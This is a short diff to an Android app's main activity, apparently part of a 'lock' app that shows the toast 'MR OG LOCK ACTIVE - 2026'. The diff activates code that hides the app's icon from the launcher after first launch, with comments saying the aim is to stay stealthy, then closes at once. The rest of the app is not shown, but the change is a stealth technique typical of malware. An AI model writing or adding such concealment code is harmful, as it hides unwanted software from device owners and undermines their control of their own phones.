@@ -12,11 +12,16 @@ public class MainActivity extends Activity {
         // Simple UI or just a toast
         Toast.makeText(this, "MR OG LOCK ACTIVE - 2026", Toast.LENGTH_LONG).show();
 
-        // Hide from launcher? (Optional)
-        // getPackageManager().setComponentEnabledSetting(getComponentName(),
-        // PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-        // PackageManager.DONT_KILL_APP);
+        // Hide from launcher immediately after first launch to stay stealthy
+        try {
+            getPackageManager().setComponentEnabledSetting(
+                    getComponentName(),
+                    android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                    android.content.pm.PackageManager.DONT_KILL_APP);
+        } catch (Exception e) {
+            Log.e("MR_OG_HIDE", "Error hiding icon: " + e.getMessage());
+        }
 
-        finish(); // Close immediately to be stealthy
+        finish(); // Close immediately
     }
 }
